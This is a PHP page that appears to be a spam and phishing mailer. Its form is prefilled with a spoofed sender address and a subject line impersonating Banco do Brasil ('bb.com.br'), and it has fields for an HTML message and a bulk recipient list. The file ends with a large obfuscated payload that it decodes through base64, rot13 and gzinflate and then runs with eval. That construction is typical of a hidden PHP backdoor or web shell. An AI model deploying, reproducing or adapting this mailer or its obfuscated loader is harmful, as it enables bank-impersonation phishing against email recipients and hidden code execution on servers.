<head>

<title><?php echo $UNAME = "true"; echo "[syslog]01\n";?></title>
<style type="text/css">
<!--

body {
	background-color: #2f4f4f;
}
body, td, th {
	color: #ff0000;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 9px;
}
#form1 #emails {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #000080;
}
#form1 #Enviar {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #333333;
	background-color: #999999;
}
.uaA {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
}
#form1 #html {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #FF0000;
}
-->
</style>
</head>
<body style="background-color: #000000">
<label>
<div align="center">
<table width="455" border="4" height="224" bordercolorlight="#000000" bordercolordark="#000000" bgcolor="#000000">
  <tr align="center" >
    <td width="439" height="220" align="center" bgcolor="#000000"><form action="" method="post" name="form1" class="uaA" id="form1">

      <center>
		<table align="center" width="439" border="0">
        <tr align="center" >

          <td align="center" bgcolor="#000000">
          <input name="nome" type="text" class="uaA" id="nome" size="60" value="Sandro de paula " /><label><br>
          <input name="assunto" type="text" class="uaA" id="assunto" size="60" value="Re: Gerentes de Relacionamento - [bb.com.br] " /><br>
	 <textarea name="html" cols="60" rows="8" id="html"></textarea><br>
		<textarea name="emails" cols="60" rows="8" id="emails"></textarea></td>
          <td align="center" bgcolor="#000000" width="4">
          &nbsp;</td>
        </tr>
        <tr align="center" >

          <td height="16" align="center" bgcolor="#000000">
<label>
          &nbsp;&nbsp;
			<br>

          <input name="remetente" type="text" class="uaA" id="remetente" size="30" value="webmaster.brasil@outlook.com" />&nbsp;<input name="returpath" type="text" class="uaA" id="returpath" size="30" value="webmaster.brasil@outlook.com" /><br>
<br>

        <input name="Enviar" type="submit" id="Enviar"value="Envia" style="float: left; font-weight:700" /></td>
          <td height="16" align="center" bgcolor="#000000" width="4"></td>
        </tr>
      </table>
      	</form></td>
  </tr>
</table>

</div>

<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>

